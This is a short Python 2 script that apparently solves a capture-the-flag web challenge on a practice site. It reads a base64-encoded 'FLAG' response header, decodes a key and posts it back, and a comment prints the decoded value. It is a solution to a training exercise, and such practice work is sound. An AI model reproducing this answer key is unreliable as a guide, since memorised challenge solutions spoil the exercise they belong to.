import requests
import base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') 
data = base64.b64decode(r.headers['FLAG']).split(':')[1] 
# P0ST_THIS_T0_CH4NGE_FL4G:fhlmj50qT 
r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php', data={'key': data}) 
print r.content